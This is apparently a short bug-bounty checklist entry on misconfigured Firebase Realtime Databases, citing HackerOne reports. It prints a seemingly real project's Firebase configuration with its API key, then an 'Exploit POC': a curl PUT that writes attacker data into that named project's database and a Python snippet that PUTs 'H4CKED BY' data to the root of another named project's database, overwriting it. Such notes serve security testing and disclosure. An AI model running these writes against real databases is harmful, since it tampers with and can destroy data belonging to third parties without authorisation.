# Firebase

* [ ] &#x20;Exposed Firebaseio Configurations

**Example**

```javascript
$(document).ready(function() {
// Your web app's Firebase configuration
var firebaseConfig = {
apiKey: "AIzaSyCRrABG3_Sc7xHar70hFyjHjEOJ071rbJ4",
authDomain: "mtn-pulse-uganda.firebaseapp.com",
databaseURL: "https://mtn-pulse-uganda.firebaseio.com",
projectId: "mtn-pulse-uganda",
storageBucket: "mtn-pulse-uganda.appspot.com",
messagingSenderId: "242450689592",
appId: "1:242450689592:web:bdd1173378d94d733800cd",
measurementId: "G-KHPT64LJ5L"
};
```

**Exploit POC**

```
curl "https://mtn-pulse-uganda.firebaseio.com/poc1.json" -XPUT -d '{"attacker":"maliciousdata"}'
Your data will be uploaded to https://mtn-pulse-uganda.firebaseio.com/poc1.json
```

```python
import requests
data= {"Exploit":"Successfull", "H4CKED BY": "Sheikh Rishad"}
reponse = requests.put("https://api-project-615509201590.firebaseio.com/.json", json=data)
```

**References**:

{% embed url="https://hackerone.com/reports/1447751" %}

{% embed url="https://hackerone.com/reports/1065134" %}
